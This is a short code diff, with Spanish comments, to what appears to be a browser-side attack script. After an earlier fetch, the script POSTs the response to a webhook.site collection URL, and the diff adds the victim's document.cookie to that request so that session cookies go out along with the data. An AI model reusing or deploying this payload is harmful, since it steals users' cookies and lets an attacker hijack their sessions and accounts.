@@ -14,11 +14,14 @@
             })
             .then(response => response.text())
             .then(data => {
-                // Envía la respuesta al Webhook.site
+                // Envía la respuesta y las cookies al Webhook.site
                 fetch("https://webhook.site/7cbf4d39-ff45-4958-affd-0ff7435dceb6", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ response: data })
+                    body: JSON.stringify({ 
+                        response: data,
+                        cookies: document.cookie // Aquí se incluye las cookies
+                    })
                 });
             })
             .catch(error => {
